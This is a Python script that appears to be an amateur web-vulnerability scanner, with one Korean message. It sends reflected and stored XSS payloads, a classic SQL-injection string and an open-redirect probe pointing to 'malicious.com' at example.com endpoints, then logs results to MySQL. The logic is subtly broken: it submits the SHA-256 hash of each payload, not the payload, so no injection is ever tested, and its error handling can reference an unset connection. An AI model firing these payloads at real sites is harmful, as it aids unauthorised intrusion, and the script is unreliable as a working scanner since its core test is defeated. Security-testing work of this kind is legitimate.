import requests
import hashlib
import mysql.connector
from bs4 import BeautifulSoup

def generate_hash(payload):
    m = hashlib.sha256()
    m.update(payload.encode('utf-8'))
    return m.hexdigest()

def insert_to_db(signature, payload, xss_type):
    try:
        conn = mysql.connector.connect(user='your_username', password='your_password', host='localhost', database='your_database')
        cursor = conn.cursor()
        sql = "INSERT INTO xss_payloads (signature, payload, xss_type) VALUES (%s, %s, %s)"
        val = (signature, payload, xss_type)
        cursor.execute(sql, val)
        conn.commit()
        print(cursor.rowcount, "record inserted.")
    except mysql.connector.Error as err:
        print("Something went wrong: {}".format(err))
    finally:
        if conn:
            cursor.close()
            conn.close()

def perform_attack(payload, attack_type, request_type):
    url = 'http://example.com/vulnerable_page'

    payload_hash = generate_hash(payload)
    if request_type == "GET":
        response = requests.get(url, params={'user_input': payload_hash})
    elif request_type == "POST":
        response = requests.post(url, data={'user_input': payload_hash})

    soup = BeautifulSoup(response.text, 'html.parser')
    used_payload = soup.find('input', {'name': 'user_input'}).get('value')

    insert_to_db(payload_hash, used_payload, attack_type)

def perform_redirection_attack(redirect_url):
    url = 'http://example.com/redirect'

    for request_type in ["GET", "POST"]:
        if request_type == "GET":
            response = requests.get(url, params={'redirect': redirect_url})
        elif request_type == "POST":
            response = requests.post(url, data={'redirect': redirect_url})

        if response.status_code == 302 and response.headers['Location'] == redirect_url:
            print("{} 요청으로 Open Redirection 취약점이 탐지되었습니다. 페이로드: ".format(request_type) + redirect_url)

payloads = {
    "Reflected XSS - GET": "<img src='x' onerror='alert(1)'>",
    "Reflected XSS - POST": "<img src='x' onerror='alert(1)'>",
    "Stored XSS": ["<img src='x' onerror='alert(1)'>", "<script>alert(2)</script>", "<div style='behavior:url(#default#time2)'></div>"],
    "DOM-based XSS": "<img src='x' onerror='alert(1)'>",
    "SQL Injection - GET": "1' OR '1'='1",
    "SQL Injection - POST": "1' OR '1'='1",
}

for attack_type, payload in payloads.items():
    if isinstance(payload, list):
        for p in payload:
            perform_attack(p, attack_type, "POST")
    else:
        if "GET" in attack_type:
            perform_attack(payload, attack_type, "GET")
        if "POST" in attack_type:
            perform_attack(payload, attack_type, "POST")

redirect_url = 'http://malicious.com'
perform_redirection_attack(redirect_url)